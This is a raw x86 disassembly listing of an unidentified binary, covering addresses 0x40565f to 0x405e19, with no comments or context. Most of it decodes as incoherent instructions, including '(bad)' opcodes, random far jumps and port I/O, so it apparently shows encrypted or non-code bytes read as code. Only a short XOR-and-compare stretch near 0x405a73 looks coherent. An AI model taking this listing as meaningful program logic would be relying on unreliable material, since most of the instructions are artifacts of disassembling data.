  40565f:	fld    TBYTE PTR ds:0x9fef25e2
  405665:	gs call 0xac31:0x289d71db
  40566d:	sub    ch,bh
  40566f:	xchg   ecx,eax
  405670:	pop    ds
  405671:	mov    esi,0x166c8f6c
  405676:	lods   al,BYTE PTR ds:[esi]
  405677:	aaa    
  405678:	mov    ds:0x6c22a390,eax
  40567d:	loop   0x405611
  40567f:	sbb    cl,BYTE PTR [esi]
  405681:	unpckhps xmm1,xmm1
  405684:	cmp    eax,0x6da25a56
  405689:	dec    ebx
  40568a:	ins    BYTE PTR es:[edi],dx
  40568b:	push   0xffffffff
  40568d:	fild   WORD PTR [edx]
  40568f:	sub    esp,ecx
  405691:	inc    ebx
  405692:	push   ds
  405693:	les    esi,FWORD PTR [edi+0x5ca78dbc]
  405699:	int    0x36
  40569b:	scas   eax,DWORD PTR es:[edi]
  40569c:	add    eax,0x97b3ddbd
  4056a1:	sub    dh,BYTE PTR [eax+0x7a]
  4056a4:	daa    
  4056a5:	xchg   BYTE PTR [esi],al
  4056a7:	jg     0x405724
  4056a9:	dec    edx
  4056aa:	or     BYTE PTR [edx+0x3eb1c09e],0xac
  4056b1:	and    BYTE PTR [eax+esi*8+0x6],ch
  4056b5:	arpl   WORD PTR [edi],ax
  4056b7:	mov    al,ds:0x1540c576
  4056bc:	out    0xe9,eax
  4056be:	jo     0x405705
  4056c0:	dec    eax
  4056c1:	or     al,0x42
  4056c3:	int3   
  4056c4:	cmp    esi,DWORD PTR [edi-0x71]
  4056c7:	iret   
  4056c8:	xor    eax,edi
  4056ca:	or     eax,edx
  4056cc:	mov    edx,DWORD PTR [ebp-0x4]
  4056cf:	dec    eax
  4056d0:	not    eax
  4056d2:	jmp    0x405a73
  4056d7:	int    0x14
  4056d9:	mov    ds:0x7ab8a317,eax
  4056de:	sbb    al,0x97
  4056e0:	mov    ah,0x18
  4056e2:	shl    edi,1
  4056e4:	repz sar WORD PTR [esi-0x424141e1],1
  4056ec:	les    edi,FWORD PTR [esi+0x69a46ebe]
  4056f2:	fstp   DWORD PTR [eax+0x52]
  4056f5:	mov    edx,0x86c3ee79
  4056fa:	jne    0x4056af
  4056fc:	push   eax
  4056fd:	inc    ebx
  4056fe:	jns    0x40572f
  405700:	ret    
  405701:	fnsave [eax+0x6eac7022]
  405707:	jnp    0x4056c2
  405709:	popf   
  40570a:	sub    eax,DWORD PTR [edi]
  40570c:	pop    ebp
  40570d:	jnp    0x405701
  40570f:	loope  0x4056e6
  405711:	popa   
  405712:	cdq    
  405713:	pusha  
  405714:	call   0xdbe0e452
  405719:	jae    0x4056a9
  40571b:	push   ss
  40571c:	dec    edx
  40571d:	push   0x59
  40571f:	imul   esp,DWORD PTR [edx-0x1361948b],0x1e39d4e9
  405729:	jns    0x4056d6
  40572b:	sbb    dh,BYTE PTR [edi]
  40572d:	mov    WORD PTR [edx-0x1180d25f],ss
  405733:	jns    0x4057a8
  405735:	adc    eax,0xa63aa72d
  40573a:	lahf   
  40573b:	loop   0x405706
  40573d:	pop    DWORD PTR [ebx-0x1cb82c87]
  405743:	sahf   
  405744:	sti    
  405745:	and    bl,BYTE PTR [edx]
  405747:	mov    ebx,0xf1af75a4
  40574c:	(bad)  
  40574d:	sahf   
  40574e:	push   ebp
  40574f:	mov    al,ds:0xc92d93ab
  405754:	xor    DWORD PTR [esp+esi*8+0x78],0x8
  405759:	(bad)  
  40575a:	(bad)  
  40575b:	leave  
  40575c:	mov    ebp,0xcfb0b7e
  405761:	mov    BYTE PTR [eax],cl
  405763:	push   esp
  405764:	sub    BYTE PTR [eax+eiz*8-0x23355cc4],bl
  40576b:	dec    edi
  40576c:	lahf   
  40576d:	jbe    0x405778
  40576f:	add    ch,0x4
  405772:	mov    edx,0xa3b5715c
  405777:	mov    ah,0x24
  405779:	mov    bl,0x4
  40577b:	inc    ecx
  40577c:	test   al,0xf2
  40577f:	addr16 adc al,0x38
  405782:	fstp   TBYTE PTR ds:0x1c25aa30
  405788:	outs   dx,BYTE PTR ds:[esi]
  405789:	adc    al,0x5
  40578b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40578c:	leave  
  40578d:	popa   
  40578e:	mov    al,ah
  405790:	adc    dl,BYTE PTR [ebx+0x5b75f444]
  405796:	cmc    
  405797:	mov    dh,0xb4
  405799:	dec    esp
  40579a:	push   0xffffff94
  40579c:	add    dh,BYTE PTR [edx-0x6a87b74c]
  4057a2:	mov    ah,0xdb
  4057a4:	mov    fs,ebx
  4057a6:	iret   
  4057a7:	mov    ah,0xb4
  4057a9:	fistp  WORD PTR [ebx+0x1b07dd65]
  4057af:	pop    ss
  4057b0:	cdq    
  4057b1:	cmp    ch,BYTE PTR [esp+esi*8-0x772bb3a9]
  4057b8:	push   edi
  4057b9:	es pop ecx
  4057bb:	test   BYTE PTR [edi+0x9ae8d8c],al
  4057c1:	cmc    
  4057c2:	sub    BYTE PTR [ebp-0x6e],bh
  4057c5:	inc    eax
  4057c7:	sti    
  4057c8:	and    esi,ebx
  4057ca:	pop    esp
  4057cb:	mov    al,es:0x8e260a33
  4057d1:	sub    al,0x88
  4057d3:	retf   0x2a20
  4057d6:	inc    edi
  4057d7:	mov    ch,0x7e
  4057d9:	pop    edx
  4057da:	jecxz  0x405835
  4057dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057dd:	mov    edx,0xa31e0280
  4057e2:	aaa    
  4057e3:	pop    ss
  4057e4:	into   
  4057e5:	sbb    eax,0x1c476e64
  4057ea:	lea    eax,[edi-0x211ff03]
  4057f0:	dec    edi
  4057f1:	lods   eax,DWORD PTR ds:[esi]
  4057f2:	dec    esi
  4057f3:	in     eax,dx
  4057f4:	stos   BYTE PTR es:[edi],al
  4057f5:	inc    edx
  4057f6:	jbe    0x405863
  4057f8:	xlat   BYTE PTR ds:[ebx]
  4057f9:	dec    esp
  4057fa:	push   ecx
  4057fb:	fwait
  4057fc:	cld    
  4057fd:	xor    DWORD PTR [ebp-0x25],edx
  405800:	ds retf 
  405802:	(bad)  
  405803:	cwde   
  405804:	xchg   ebp,eax
  405805:	or     BYTE PTR [edx+eax*2+0x33af4d5e],0x99
  40580d:	inc    esp
  40580e:	inc    eax
  40580f:	into   
  405810:	aam    0x10
  405812:	jge    0x40588b
  405814:	ins    BYTE PTR es:[edi],dx
  405815:	sbb    al,bl
  405817:	scas   al,BYTE PTR es:[edi]
  405818:	mov    ch,0x77
  40581a:	pop    ecx
  40581b:	and    al,0x8e
  40581d:	(bad)  
  40581f:	fst    QWORD PTR [ebp-0x78db8322]
  405825:	scas   al,BYTE PTR es:[edi]
  405826:	mov    ebp,0x507afe52
  40582b:	test   eax,0x14407c58
  405830:	loopne 0x405866
  405832:	fnstcw WORD PTR [edi]
  405834:	pop    ebx
  405835:	inc    esp
  405836:	mov    ds:0xf9bee1e2,eax
  40583b:	cmc    
  40583c:	pop    ebx
  40583d:	imul   ax,WORD PTR [ebx],0xff82
  405841:	add    edi,DWORD PTR [edi+0x8]
  405844:	mov    al,BYTE PTR [ebx]
  405846:	lods   al,BYTE PTR ds:[esi]
  405847:	arpl   WORD PTR [esi],ax
  405849:	jns    0x405863
  40584b:	xor    BYTE PTR [ebx+ebp*1],cl
  40584e:	jl     0x40587a
  405850:	repz cld 
  405852:	ret    
  405853:	hlt    
  405854:	dec    eax
  405855:	mov    cl,0xe7
  405857:	pop    ss
  405858:	aam    0x48
  40585a:	rcl    DWORD PTR ds:0x4cfaf487,cl
  405860:	pop    ebp
  405861:	ficomp WORD PTR [edx]
  405863:	sahf   
  405864:	or     BYTE PTR [edi-0x42],al
  405867:	mov    al,0x34
  405869:	cwde   
  40586a:	adc    al,0x0
  40586c:	gs test al,0xea
  40586f:	add    eax,DWORD PTR [esi-0x18073de4]
  405875:	lock js 0x4058dd
  405878:	jo     0x405863
  40587a:	cwde   
  40587b:	xor    eax,0x852f030
  405880:	mov    ebp,0x3a07905d
  405885:	loope  0x4058f7
  405887:	dec    eax
  405888:	pop    ss
  405889:	aas    
  40588a:	add    ecx,esp
  40588c:	push   esp
  40588d:	std    
  40588e:	mov    al,0x17
  405890:	sub    DWORD PTR [eax],0xb8ed8732
  405896:	sub    bl,BYTE PTR [ebx+0x54]
  405899:	sub    al,0xc
  40589b:	mov    bh,0x60
  40589d:	push   ecx
  40589e:	clc    
  40589f:	call   DWORD PTR [edx]
  4058a1:	add    DWORD PTR [ebx+0x38f2363f],0x7f2cac28
  4058ab:	mov    dl,0x66
  4058ad:	je     0x405899
  4058af:	push   edx
  4058b0:	inc    esp
  4058b1:	pop    esp
  4058b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058b3:	or     al,0x6d
  4058b5:	adc    BYTE PTR [ebp-0x69],0x2a
  4058b9:	in     eax,dx
  4058ba:	xlat   BYTE PTR ds:[ebx]
  4058bb:	mov    bh,0xeb
  4058bd:	xlat   BYTE PTR ds:[ebx]
  4058be:	push   ebx
  4058bf:	fwait
  4058c0:	in     al,0x19
  4058c2:	fnstenv [eax+0x11]
  4058c5:	jns    0x4058f2
  4058c7:	adc    DWORD PTR [ebx+0x1f],ecx
  4058ca:	mov    esp,0x2b91b92b
  4058cf:	jns    0x4058e4
  4058d1:	pusha  
  4058d2:	out    0x7,eax
  4058d4:	nop
  4058d5:	and    bl,BYTE PTR [esi]
  4058d7:	sbb    al,dl
  4058d9:	adc    al,BYTE PTR [ebx]
  4058db:	jmp    0x405926
  4058dd:	enter  0xd65a,0x67
  4058e1:	cmc    
  4058e2:	or     BYTE PTR [esi+0x0],0xe9
  4058e6:	add    DWORD PTR [eax],esi
  4058e8:	push   eax
  4058e9:	xchg   ecx,eax
  4058ea:	mov    bl,0xc5
  4058ec:	pop    esp
  4058ed:	clc    
  4058ee:	xchg   esp,ecx
  4058f0:	aaa    
  4058f1:	dec    ecx
  4058f2:	ja     0x4058b2
  4058f4:	and    BYTE PTR [ecx-0x22],bh
  4058f7:	leave  
  4058f8:	add    al,0x2d
  4058fa:	into   
  4058fb:	cmp    esi,0x30
  4058fe:	test   al,0x57
  405900:	push   ds
  405901:	aaa    
  405902:	push   edx
  405903:	pop    edi
  405904:	jge    0x405974
  405906:	les    eax,FWORD PTR [ebp-0x34]
  405909:	lea    esp,ds:0xada0a6ce
  40590f:	repz pop ss
  405911:	push   ecx
  405912:	sti    
  405913:	leave  
  405914:	push   cs
  405915:	(bad)  
  405916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405917:	shl    BYTE PTR [ebx-0x2],cl
  40591a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40591b:	xchg   DWORD PTR [edx],ebp
  40591d:	push   ebx
  40591e:	xor    ch,BYTE PTR [ebp-0x6be82438]
  405924:	mov    edx,DWORD PTR [eax+ebx*8-0x58]
  405928:	xor    eax,DWORD PTR [ebp+0x65]
  40592b:	mov    ebp,0x50321cad
  405930:	mov    esi,0x7460b7ac
  405935:	pop    eax
  405936:	mov    cl,0xf0
  405938:	fdiv   DWORD PTR [ebx+0x79]
  40593b:	mov    DWORD PTR [ebx+ecx*4],edx
  40593e:	repnz xor al,0x21
  405941:	ds jecxz 0x4058cd
  405944:	push   ebp
  405945:	shr    BYTE PTR [esi],1
  405947:	xor    al,BYTE PTR [edi-0x43d25d64]
  40594d:	arpl   WORD PTR [esi],cx
  40594f:	pusha  
  405950:	sub    edi,0xffffffe1
  405953:	pop    ss
  405954:	out    dx,al
  405955:	or     BYTE PTR [edi+eax*8],dl
  405958:	ret    0xe368
  40595b:	sbb    BYTE PTR [ecx],al
  40595d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40595e:	sub    bh,BYTE PTR [esi]
  405960:	das    
  405961:	ret    0x6ea9
  405964:	cmp    bl,BYTE PTR [eax+0x58]
  405967:	jo     0x40590a
  405969:	mov    DWORD PTR [ecx+0x69e87477],esi
  40596f:	sub    ebp,DWORD PTR [ebx+0x12aa49ed]
  405975:	(bad)  [edx]
  405977:	adc    al,0xc7
  405979:	xor    BYTE PTR [ebp+esi*1+0x23],ah
  40597d:	mov    BYTE PTR ds:0xc26ecee5,ch
  405983:	pop    ebp
  405984:	ror    cl,0x25
  405987:	pop    esp
  405988:	mov    al,ds:0x292e4b8d
  40598d:	int3   
  40598e:	(bad)  
  40598f:	dec    esp
  405990:	inc    eax
  405991:	jl     0x4059c0
  405993:	loopne 0x40598b
  405995:	sub    ah,BYTE PTR [ecx+esi*1+0x6e]
  405999:	push   edx
  40599a:	xchg   esi,eax
  40599b:	pop    ss
  40599c:	retf   
  40599d:	cmp    al,0xa9
  40599f:	rcr    BYTE PTR [edx-0x7e3577b0],0xb0
  4059a6:	push   cs
  4059a7:	sub    dh,BYTE PTR [esi-0x70]
  4059aa:	cs xor al,0x44
  4059ad:	and    BYTE PTR [ebx-0x39],ah
  4059b0:	mov    ah,bh
  4059b2:	cld    
  4059b3:	mov    esp,0xeb8547a9
  4059b8:	cld    
  4059b9:	shl    BYTE PTR [ecx],0x62
  4059bc:	jmp    0xc284:0xacfb2f6f
  4059c3:	jle    0x4059c8
  4059c5:	jl     0x405a2b
  4059c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059c8:	daa    
  4059c9:	inc    esi
  4059ca:	scas   al,BYTE PTR es:[edi]
  4059cb:	scas   al,BYTE PTR es:[edi]
  4059cc:	xor    edx,ecx
  4059ce:	and    BYTE PTR [ebx+esi*2],ch
  4059d1:	cmc    
  4059d2:	and    DWORD PTR [eax+0x2c],0xffffffac
  4059d6:	push   ss
  4059d7:	das    
  4059d8:	movzx  edx,WORD PTR [ebx-0x6f]
  4059dc:	cmp    bl,ch
  4059de:	mov    ebx,0x261ff27d
  4059e3:	addr16 or eax,0xfaacf832
  4059e9:	in     al,0x60
  4059eb:	inc    esi
  4059ec:	dec    ecx
  4059ed:	sub    ebx,esi
  4059ef:	stc    
  4059f0:	stos   DWORD PTR es:[edi],eax
  4059f1:	push   edi
  4059f2:	push   0xfffffffe
  4059f4:	ret    0xdce5
  4059f7:	xor    ah,BYTE PTR [esi+0x34]
  4059fa:	cld    
  4059fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059fc:	mov    esi,0x2d1f69f5
  405a01:	cmp    bl,ah
  405a03:	test   eax,0x91ec8d4e
  405a08:	int    0xee
  405a0a:	call   0x552643f9
  405a0f:	mov    DWORD PTR es:[edi-0x3b],esi
  405a13:	mov    ebx,0xbf9e5bee
  405a18:	xchg   ebx,eax
  405a19:	in     al,dx
  405a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a1b:	mov    ds,edi
  405a1d:	pop    ebx
  405a1e:	inc    esi
  405a1f:	push   esp
  405a20:	aas    
  405a21:	loope  0x405a23
  405a23:	push   ebp
  405a24:	ss jno 0x405aa0
  405a27:	mov    eax,ds:0xe35665e2
  405a2c:	jne    0x4059e3
  405a2e:	push   0xfffffffe
  405a30:	xor    BYTE PTR [ecx-0x5],bl
  405a33:	stos   BYTE PTR es:[edi],al
  405a34:	imul   esp,ebp,0xffffffaa
  405a37:	mov    DWORD PTR [ebp-0x1d],edi
  405a3a:	add    eax,0x67b631eb
  405a3f:	mov    edi,0x4fca9cbc
  405a44:	icebp  
  405a45:	ins    BYTE PTR es:[edi],dx
  405a46:	retf   
  405a47:	pop    esp
  405a48:	(bad)  
  405a49:	jmp    0xeaf:0x96bf5cb3
  405a50:	scas   al,BYTE PTR es:[edi]
  405a51:	pusha  
  405a52:	and    al,0x70
  405a54:	lock sar DWORD PTR [eax-0x34],1
  405a58:	xor    BYTE PTR [ebp+0x2e0fd71a],dl
  405a5e:	jbe    0x4059ef
  405a60:	ret    0x574b
  405a63:	xchg   DWORD PTR [ecx+0x3db9fd67],esp
  405a69:	or     al,0x92
  405a6b:	(bad)  
  405a6c:	pop    ss
  405a6d:	lock mov ch,dh
  405a70:	das    
  405a71:	dec    eax
  405a72:	stos   DWORD PTR es:[edi],eax
  405a73:	and    eax,edx
  405a75:	xor    ecx,edi
  405a77:	mov    DWORD PTR [ebp-0x4],eax
  405a7a:	mov    DWORD PTR [ebp+0x14],ecx
  405a7d:	xor    eax,eax
  405a7f:	or     DWORD PTR [ebp+0x14],eax
  405a82:	mov    eax,DWORD PTR [ebp-0x50]
  405a85:	mov    ecx,DWORD PTR [ebp-0x4c]
  405a88:	shrd   eax,ecx,0x2
  405a8c:	shr    ecx,0x2
  405a8f:	mov    cx,ax
  405a92:	mov    eax,DWORD PTR [ebp-0x50]
  405a95:	mov    edx,0x6d5d
  405a9a:	xor    cx,dx
  405a9d:	mov    edx,DWORD PTR [ebp-0x4c]
  405aa0:	xor    edx,edx
  405aa2:	shl    eax,0x1e
  405aa5:	mov    ax,dx
  405aa8:	or     ax,cx
  405aab:	mov    ecx,DWORD PTR [ebp-0x4]
  405aae:	cmp    WORD PTR [ecx],ax
  405ab1:	je     0x406288
  405ab7:	mov    eax,DWORD PTR [ebp+0x14]
  405aba:	sub    DWORD PTR [ebp-0x4],eax
  405abd:	mov    eax,DWORD PTR [esi]
  405abf:	jmp    0x405e60
  405ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ac5:	test   eax,0x3c522b52
  405aca:	mov    eax,0x46ddf0ac
  405acf:	xchg   edx,eax
  405ad0:	lds    esi,FWORD PTR [ebp-0x37]
  405ad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ad4:	mov    ebp,0xbdbebe25
  405ad9:	les    edi,FWORD PTR [esi-0x467c742]
  405adf:	xchg   ebx,eax
  405ae0:	in     eax,dx
  405ae1:	shl    BYTE PTR [eax-0x16],1
  405ae4:	loopne 0x405ae8
  405ae6:	pop    edi
  405ae7:	addr16 inc ecx
  405ae9:	loope  0x405b13
  405aeb:	es mov ch,0x3f
  405aee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405aef:	stos   BYTE PTR es:[edi],al
  405af0:	push   0x50
  405af2:	pop    esp
  405af3:	ja     0x405b22
  405af5:	xor    ebx,DWORD PTR [ecx]
  405af7:	fmul   DWORD PTR [ebx-0x7a]
  405afa:	iret   
  405afb:	mul    DWORD PTR [edi]
  405afd:	inc    edx
  405afe:	jmp    0x4a891df2
  405b03:	xchg   ebp,eax
  405b04:	push   eax
  405b05:	xchg   ebx,esp
  405b07:	jl     0x405ae3
  405b09:	pop    ds
  405b0a:	fisubr WORD PTR [esi+0x1c]
  405b0d:	imul   eax,DWORD PTR [ecx+0x6784ee4e],0x2
  405b14:	cdq    
  405b15:	mov    ebp,0xb2f80f62
  405b1a:	xchg   ebp,eax
  405b1b:	lea    ebx,[esi+0x32499aca]
  405b21:	dec    ecx
  405b22:	mov    eax,ds:0x81a87cbc
  405b27:	push   edi
  405b28:	pop    eax
  405b29:	push   ebx
  405b2a:	bound  edx,QWORD PTR [esp+edi*4-0x61]
  405b2e:	xchg   eax,edx
  405b30:	ret    
  405b31:	das    
  405b32:	fmul   QWORD PTR [edx]
  405b34:	fldenv [eax+0x3f2f6bc6]
  405b3a:	scas   eax,DWORD PTR es:[edi]
  405b3b:	fcomp  QWORD PTR [edi+0x47e9eb7c]
  405b41:	add    eax,0x7145cac8
  405b46:	fnstcw WORD PTR [eax+0x39]
  405b49:	in     al,0x9e
  405b4b:	mov    eax,ds:0xbf7b8d8
  405b50:	sar    BYTE PTR [edi+eax*2+0xe3aadaf],1
  405b57:	fild   QWORD PTR [ebx+0xcac9177]
  405b5d:	loopne 0x405b34
  405b5f:	adc    dh,BYTE PTR [ebx+0x50]
  405b62:	cmp    DWORD PTR ds:0x4d3b3f64,ebp
  405b68:	arpl   WORD PTR [esi+edx*8-0xa99fb52],dx
  405b6f:	push   ebp
  405b70:	or     ah,al
  405b72:	out    0x20,eax
  405b74:	mov    cl,0xf1
  405b76:	push   ebp
  405b77:	push   0x13e7eeff
  405b7c:	dec    ebx
  405b7d:	leave  
  405b7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b7f:	icebp  
  405b80:	ror    BYTE PTR [bp+di-0x6fa3],1
  405b85:	add    bl,BYTE PTR [ebp-0x4f98c208]
  405b8b:	push   ebx
  405b8c:	jp     0x405b3b
  405b8e:	xchg   esi,eax
  405b8f:	dec    esp
  405b90:	test   BYTE PTR [esi+0x1bcbadc7],ah
  405b96:	mov    al,ds:0x2abc7cf
  405b9b:	xchg   edx,eax
  405b9c:	enter  0x14d,0x53
  405ba0:	or     ah,cl
  405ba2:	pop    esp
  405ba3:	push   eax
  405ba4:	xor    BYTE PTR [edx+0x0],dl
  405ba7:	adc    al,0x60
  405ba9:	pop    ebp
  405baa:	in     al,dx
  405bab:	repnz cwde 
  405bad:	in     al,dx
  405bae:	retf   
  405baf:	mov    al,0x95
  405bb1:	dec    esp
  405bb2:	sub    al,0xc0
  405bb4:	xchg   edi,eax
  405bb5:	lds    ecx,FWORD PTR [ecx-0x16e3470c]
  405bbb:	push   edi
  405bbc:	arpl   cx,dx
  405bbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bbf:	int    0x5d
  405bc1:	ror    DWORD PTR [edx-0x27591bb9],1
  405bc7:	lea    ebp,[edi+0x7a04fd59]
  405bcd:	mov    ebp,0x9c4ed21
  405bd2:	ret    0x2022
  405bd5:	not    DWORD PTR [ebx-0x64c12d66]
  405bdb:	adc    BYTE PTR [edx-0x68373f0f],0xa8
  405be2:	sbb    eax,0x90ba02fc
  405be7:	cmc    
  405be8:	or     al,0xbc
  405bea:	loop   0x405c50
  405bec:	push   es
  405bed:	fcom   st(5)
  405bef:	push   0x9ec4d62d
  405bf4:	aad    0x79
  405bf6:	rcr    BYTE PTR [ebx-0x5f1b3495],1
  405bfc:	xlat   BYTE PTR ds:[ebx]
  405bfd:	push   ebx
  405bfe:	nop
  405bff:	mov    bh,0xc0
  405c01:	aad    0x96
  405c03:	fdiv   st(3),st
  405c05:	outs   dx,BYTE PTR ds:[esi]
  405c06:	push   ebp
  405c07:	mov    eax,ds:0x97751b5b
  405c0c:	mov    dl,0x5f
  405c0e:	fwait
  405c0f:	dec    esp
  405c10:	dec    ebp
  405c11:	inc    esp
  405c12:	dec    esp
  405c13:	jl     0x405ba3
  405c15:	std    
  405c16:	cmp    ecx,DWORD PTR [edx]
  405c18:	pop    ss
  405c19:	jmp    0x2cd5:0x778eb422
  405c20:	pop    ds
  405c21:	mov    ebp,0x64efa693
  405c26:	call   DWORD PTR [ecx-0x4904c303]
  405c2c:	cwde   
  405c2d:	xchg   DWORD PTR [ebx+esi*2-0x7237794],esp
  405c34:	xchg   edi,eax
  405c35:	push   ss
  405c36:	mov    ebp,0x1128ceee
  405c3b:	adc    ebp,DWORD PTR [esi+0x605d0586]
  405c41:	shl    DWORD PTR [edi+edx*8+0x8],0xfe
  405c46:	adc    BYTE PTR [edi-0x2f],dl
  405c49:	mov    esp,0x28922c97
  405c4e:	sub    al,0x3a
  405c51:	dec    ebp
  405c52:	es sub eax,0x5a69bf2
  405c58:	pusha  
  405c59:	pop    edi
  405c5a:	(bad)  
  405c5b:	adc    al,0x36
  405c5d:	dec    ebp
  405c5e:	xchg   ebp,eax
  405c5f:	rcl    DWORD PTR [ebx+0x73],0x5b
  405c63:	stos   BYTE PTR es:[edi],al
  405c64:	add    dl,BYTE PTR [edi]
  405c66:	xchg   esp,eax
  405c67:	pop    ebp
  405c68:	cmp    ah,BYTE PTR [ecx-0x1b]
  405c6b:	mul    DWORD PTR [edi+0x24]
  405c6e:	pop    ebx
  405c6f:	rol    BYTE PTR ds:0x56e27681,0x80
  405c76:	jo     0x405c71
  405c78:	sbb    DWORD PTR [eax+0x47f3022],0xd7b16678
  405c82:	pushf  
  405c83:	mov    ch,0xdc
  405c85:	shl    BYTE PTR [edi+ecx*1+0x77d73da5],0xdb
  405c8d:	push   esp
  405c8e:	mov    eax,ds:0x6b3e669d
  405c93:	mov    WORD PTR [ebp+0x44e9a2af],fs
  405c99:	ss push 0xf0a058a5
  405c9f:	popa   
  405ca0:	pop    esi
  405ca1:	mov    bl,ah
  405ca3:	jb     0x405c46
  405ca5:	fnsave [edi+0x72]
  405ca8:	retf   0xc4e0
  405cab:	mov    cl,0x2f
  405cad:	and    BYTE PTR [edi-0x6b],bl
  405cb0:	ins    BYTE PTR es:[edi],dx
  405cb1:	inc    edi
  405cb2:	inc    ecx
  405cb3:	fist   DWORD PTR ds:0xe44099e6
  405cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cba:	adc    edi,DWORD PTR [edi]
  405cbc:	xor    ecx,DWORD PTR [ebx-0x4e315d5f]
  405cc2:	jge    0x405caf
  405cc4:	out    dx,eax
  405cc5:	cli    
  405cc6:	mov    esi,0x568e0b04
  405ccb:	outs   dx,DWORD PTR fs:[esi]
  405ccd:	pop    ecx
  405cce:	gs mov al,0x3f
  405cd1:	push   ds
  405cd2:	jo     0x405c7b
  405cd4:	or     al,0x4b
  405cd6:	xchg   ecx,eax
  405cd7:	inc    ebx
  405cd8:	ds inc esp
  405cda:	cdq    
  405cdb:	mov    WORD PTR [edx+0x744e2816],?
  405ce1:	(bad)  
  405ce2:	loop   0x405cc8
  405ce4:	jbe    0x405cca
  405ce6:	pop    esp
  405ce7:	and    al,0xbb
  405ce9:	jle    0x405d0a
  405ceb:	xchg   ebx,eax
  405cec:	mov    DWORD PTR [ebp-0x34],eax
  405cef:	in     eax,0x26
  405cf1:	js     0x405d30
  405cf3:	and    al,0xb5
  405cf5:	mov    ds:0x64e278cd,eax
  405cfa:	nop
  405cfb:	xor    eax,0xbc13d968
  405d00:	pop    esp
  405d01:	ins    DWORD PTR es:[edi],dx
  405d02:	data16 add dl,ch
  405d05:	mov    ch,0xa8
  405d07:	mov    ds:0xd1838881,eax
  405d0c:	xchg   esi,eax
  405d0d:	test   al,0x32
  405d0f:	push   edi
  405d10:	jnp    0x405d7d
  405d12:	cwde   
  405d13:	rol    BYTE PTR [eax-0x7aa9b044],0x3c
  405d1a:	cmp    eax,0xf1674e73
  405d1f:	setl   BYTE PTR [eax-0x23]
  405d23:	stos   BYTE PTR es:[edi],al
  405d24:	nop
  405d25:	dec    ebx
  405d26:	repz not BYTE PTR [edx]
  405d29:	mov    dh,0xdb
  405d2b:	jae    0x405d97
  405d2d:	ja     0x405cfa
  405d2f:	jecxz  0x405d79
  405d31:	(bad)  
  405d32:	(bad)  
  405d33:	vpxor  ymm0,ymm1,YMMWORD PTR [ebp-0xcb53a9b]
  405d3b:	add    eax,0x1f2a9d28
  405d40:	add    eax,0x73fcbf1d
  405d45:	jmp    0xd00e14f
  405d4a:	sub    DWORD PTR [edi+0x5d],esi
  405d4d:	add    eax,0xe4c83318
  405d52:	or     DWORD PTR [ecx+0x460d3133],ebx
  405d58:	adc    eax,0xed0ac10b
  405d5d:	retf   
  405d5e:	mov    ch,ch
  405d60:	mov    edi,0x36548b09
  405d65:	and    edx,DWORD PTR [ecx-0x5a]
  405d68:	jne    0x405d85
  405d6a:	popf   
  405d6b:	in     eax,0x7a
  405d6d:	xor    eax,0x7648502e
  405d72:	call   0xc61d774
  405d77:	pop    edx
  405d78:	inc    edx
  405d79:	pop    es
  405d7a:	int3   
  405d7b:	aas    
  405d7c:	lock jb 0x405d09
  405d7f:	jne    0x405e00
  405d81:	into   
  405d82:	or     BYTE PTR [ecx+0x17],dl
  405d85:	js     0x405df8
  405d87:	jg     0x405d12
  405d89:	sub    BYTE PTR [edx-0x68],dh
  405d8c:	xchg   DWORD PTR [ebx+0x4f505f4c],esi
  405d92:	stc    
  405d93:	aaa    
  405d94:	xor    esi,DWORD PTR [esi-0x39]
  405d97:	aas    
  405d98:	jo     0x405d62
  405d9a:	adc    ah,BYTE PTR ss:[ebp-0x6c]
  405d9e:	sub    bl,ch
  405da0:	adc    eax,0x97709dac
  405da5:	in     al,0xcf
  405da7:	mov    al,ds:0x5dd20300
  405dac:	push   eax
  405dad:	xchg   esi,eax
  405dae:	fcmovne st,st(2)
  405db0:	mov    bl,0x27
  405db2:	sbb    ebx,DWORD PTR [edx+edi*2]
  405db5:	(bad)  [edx-0x2246034d]
  405dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dbc:	shl    esi,cl
  405dbe:	pop    es
  405dbf:	and    dh,0xe2
  405dc2:	adc    DWORD PTR fs:[eax],0xd
  405dc6:	mov    eax,ds:0xba784cb3
  405dcb:	jbe    0x405dde
  405dcd:	cmp    eax,0x86c21248
  405dd2:	mov    ebx,0xb4f8405b
  405dd7:	retf   
  405dd8:	and    al,0x99
  405dda:	jge    0x405e1f
  405ddc:	in     al,dx
  405ddd:	into   
  405dde:	ror    DWORD PTR [edi+0x2d16d53a],cl
  405de4:	pop    es
  405de5:	or     eax,edi
  405de7:	lods   al,BYTE PTR ds:[esi]
  405de8:	mov    dh,0x9
  405dea:	jb     0x405de1
  405dec:	sbb    ebp,edi
  405dee:	dec    ebp
  405def:	push   0x6
  405df1:	mov    dl,0x9c
  405df3:	ins    DWORD PTR es:[edi],dx
  405df4:	mov    esi,0x496624b3
  405df9:	mov    bl,0xad
  405dfb:	dec    eax
  405dfc:	stc    
  405dfd:	stos   DWORD PTR es:[edi],eax
  405dfe:	mov    ch,0x43
  405e00:	push   esp
  405e01:	add    eax,DWORD PTR [esi+0x35]
  405e04:	dec    esi
  405e05:	gs adc ch,dl
  405e08:	xor    ah,BYTE PTR [eax+0x7060edd1]
  405e0e:	ror    BYTE PTR [ecx],0xf3
  405e11:	outs   dx,DWORD PTR ds:[esi]
  405e12:	jp     0x405dad
  405e14:	inc    edi
  405e15:	pop    esp
  405e16:	shl    DWORD PTR [esi],0x6e
  405e19:	shl    dh,0x8
